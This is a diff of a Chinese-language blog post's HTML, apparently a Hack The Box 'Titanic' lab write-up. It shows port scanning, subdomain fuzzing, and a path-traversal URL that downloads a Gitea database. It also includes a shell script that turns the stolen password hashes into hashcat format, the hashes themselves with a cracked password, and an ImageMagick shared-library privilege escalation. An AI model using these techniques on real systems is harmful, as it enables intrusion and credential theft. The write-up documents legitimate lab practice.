@@ -8,12 +8,12 @@
     <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
     <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="信息收集nmap --min-rate 10000 -p- 10.10.11.55扫描全端口   详细扫描 nmap -sT -sC -sV -O 10.10.11.55  添加下映射然后访问。 看下服务端   使用的是Werkzeug&#x2F;3.0.3 Python&#x2F;3.10.12，这个岸版本是存在cve的CVE-2024-49766&#x2F;CVE-2024-49767，但是好">
+    <meta name="description" content="信息收集 nmap --min-rate 10000 -p- 10.10.11.55 扫描全端口  详细扫描 nmap -sT -sC -sV -O 10.10.11.55  添加下映射然后访问。 看下服务端  使用的是Werkzeug&#x2F;3.0.3 Python&#x2F;3.10.12，这个岸版本是存在cve的CVE-2024-49766&#x2F;CVE-2024-49767，但是好像并不适用这里。抓包看看  好">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Titanic-HTB">
 <meta property="og:url" content="https://oceanzbz.github.io/post/7f2875cc.html">
 <meta property="og:site_name" content="Oceanzbz&#39;s Blog">
-<meta property="og:description" content="信息收集nmap --min-rate 10000 -p- 10.10.11.55扫描全端口   详细扫描 nmap -sT -sC -sV -O 10.10.11.55  添加下映射然后访问。 看下服务端   使用的是Werkzeug&#x2F;3.0.3 Python&#x2F;3.10.12，这个岸版本是存在cve的CVE-2024-49766&#x2F;CVE-2024-49767，但是好">
+<meta property="og:description" content="信息收集 nmap --min-rate 10000 -p- 10.10.11.55 扫描全端口  详细扫描 nmap -sT -sC -sV -O 10.10.11.55  添加下映射然后访问。 看下服务端  使用的是Werkzeug&#x2F;3.0.3 Python&#x2F;3.10.12，这个岸版本是存在cve的CVE-2024-49766&#x2F;CVE-2024-49767，但是好像并不适用这里。抓包看看  好">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://oceanzbz.github.io/post/7f2875cc/IMAGE20250228221858125.png">
 <meta property="og:image" content="https://oceanzbz.github.io/post/7f2875cc/IMAGE20250228222122068.png">
@@ -201,59 +201,55 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><code>nmap --min-rate 10000 -p- 10.10.11.55</code><br>扫描全端口</p>
+    <h2 id="信息收集">信息收集</h2>
+<p><code>nmap --min-rate 10000 -p- 10.10.11.55</code><br>
+扫描全端口</p>
 <img src="/post/7f2875cc/IMAGE20250228221858125.png" class="">
-
 <p>详细扫描</p>
 <p><code>nmap -sT -sC -sV -O 10.10.11.55</code></p>
 <img src="/post/7f2875cc/IMAGE20250228222122068.png" class="">
 <p>添加下映射然后访问。</p>
 <p>看下服务端</p>
 <img src="/post/7f2875cc/IMAGE20250228223438949.png" class="">
-
-<p>使用的是Werkzeug&#x2F;3.0.3 Python&#x2F;3.10.12，这个岸版本是存在cve的CVE-2024-49766&#x2F;CVE-2024-49767，但是好像并不适用这里。抓包看看</p>
+<p>使用的是Werkzeug/3.0.3 Python/3.10.12，这个岸版本是存在cve的CVE-2024-49766/CVE-2024-49767，但是好像并不适用这里。抓包看看</p>
 <img src="/post/7f2875cc/IMAGE20250228224226740.png" class="">
 <p>好像页面也就这里可以提交然后下载一个json文件就是自己填的内容抓这个下载的包好像可以任意文件下载</p>
 <img src="/post/7f2875cc/IMAGE20250228224333252.png" class="">
-
-
-
 <p>子域名爆破发现了一个域名</p>
 <p><code>ffuf -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt -u http://titanic.htb/ -H &quot;Host:FUZZ.titanic.htb&quot;  -fc 301</code></p>
 <p>发现一个子域名 dev.tiantic.htb</p>
 <img src="/post/7f2875cc/IMAGE20250228225526033.png" class="">
 <p>找到俩配置文件</p>
 <img src="/post/7f2875cc/IMAGE20250228225936392.png" class="">
-
 <img src="/post/7f2875cc/IMAGE20250228230019755.png" class="">
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><a target="_blank" rel="noopener" href="https://docs.gitea.com/zh-cn/next/administration/config-cheat-sheet">https://docs.gitea.com/zh-cn/next/administration/config-cheat-sheet</a><br>结合刚刚发现的任意文件下载，去下载子域名的敏感文件</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p><a target="_blank" rel="noopener" href="https://docs.gitea.com/zh-cn/next/administration/config-cheat-sheet">https://docs.gitea.com/zh-cn/next/administration/config-cheat-sheet</a><br>
+结合刚刚发现的任意文件下载，去下载子域名的敏感文件</p>
 <img src="/post/7f2875cc/IMAGE20250228225714834.png" class="">
-
-<p>但是这里用的是docker环境<br><a target="_blank" rel="noopener" href="https://docs.gitea.com/zh-cn/next/installation/install-with-docker#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">https://docs.gitea.com/zh-cn/next/installation/install-with-docker#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F</a></p>
+<p>但是这里用的是docker环境<br>
+<a target="_blank" rel="noopener" href="https://docs.gitea.com/zh-cn/next/installation/install-with-docker#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">https://docs.gitea.com/zh-cn/next/installation/install-with-docker#环境变量</a></p>
 <img src="/post/7f2875cc/IMAGE20250228225758198.png" class="">
-
 <p>结合上面的docker配置文件去下载这个敏感文件</p>
 <img src="/post/7f2875cc/IMAGE20250228230214761.png" class="">
-
 <p>找到一个数据库路径去下载看看</p>
 <p>url <a target="_blank" rel="noopener" href="http://titanic.htb/download?ticket=../../../../../home/developer/gitea/data/gitea/gitea.db">http://titanic.htb/download?ticket=../../../../../home/developer/gitea/data/gitea/gitea.db</a> -o gitea.db</p>
 <img src="/post/7f2875cc/IMAGE20250228231213689.png" class="">
-
 <p>这样看不好看学到一手显示列名 .headers on然后在看</p>
 <img src="/post/7f2875cc/IMAGE20250301000200248.png" class="">
 <p>但是这样好像没法用hashcat爆破得把pbkdf 的hash改成符合hashcat爆破的格式，参考其他师傅的文章</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite3 gitea.db &quot;select passwd,salt,name from user&quot; | while read data; do            digest=$(echo &quot;$data&quot; | cut -d&#x27;|&#x27; -f1 | xxd -r -p | base64)            salt=$(echo &quot;$data&quot; | cut -d&#x27;|&#x27; -f2 | xxd -r -p | base64)            name=$(echo $data | cut -d&#x27;|&#x27; -f 3)            echo &quot;$&#123;name&#125;:sha256:50000:$&#123;salt&#125;:$&#123;digest&#125;&quot;          done | tee gitea.hashes</span><br></pre></td></tr></table></figure>
-
 <p>使用以上脚本转换成符合hashcat爆破的格式</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=          developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=          Nagar:sha256:50000:jYadp3JXkz0GzadV63zmAA==:tF7VBXAhxIEaq13YgKDvT/5705o0oswfaorNLnYTzrziQuJ0ZoEEEJPs9S4IJs90iUY=          biba:sha256:50000:QnFYiOozoqewByNi/wZZ0Q==:x/BT8UAuOK9WPW1l6A1p0gNtEFKSIPXDji1pCjDBaFYssJmrImwZLEDtnA3auhRtCR4=          xxs:sha256:50000:pFevdlMocglgnOtDlkNE1w==:oiBW7BJh7UNBLJgsKnOayOWVBMCpyFIlllKr6GyScbPyZoMgCgLlFR/lWaXPAMY7ZqE=</span><br></pre></td></tr></table></figure>
-
 <p>爆破出密码developer:25282528</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>find / -writable -type d 2&gt;/dev/null</code></p>
+<h2 id="提权">提权</h2>
+<p><code>find / -writable -type d 2&gt;/dev/null</code></p>
 <img src="/post/7f2875cc/IMAGE20250228234114556.png" class="">
-
-<p>利用点在这里CVE-2024-41817<br><a target="_blank" rel="noopener" href="https://imagemagick.org/index.php">https://imagemagick.org/index.php</a><br>它在执行 <code>ImageMagick</code> 时通过在当前工作目录中加载恶意共享库来利用任意代码执行<br>先切换到<code>/opt/app/static/assets/images/</code>目录下<br>创建一个共享库，复制<code>/root/root.txt</code>文件并更改其权限</p>
+<p>利用点在这里CVE-2024-41817<br>
+<a target="_blank" rel="noopener" href="https://imagemagick.org/index.php">https://imagemagick.org/index.php</a><br>
+它在执行 <code>ImageMagick</code> 时通过在当前工作目录中加载恶意共享库来利用任意代码执行<br>
+先切换到<code>/opt/app/static/assets/images/</code>目录下<br>
+创建一个共享库，复制<code>/root/root.txt</code>文件并更改其权限</p>
 <img src="/post/7f2875cc/IMAGE20250228235312384.png" class="">
-
 <p>参考：<a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2024/12/14/htb-compiled.html">https://0xdf.gitlab.io/2024/12/14/htb-compiled.html</a></p>
 
   </div>
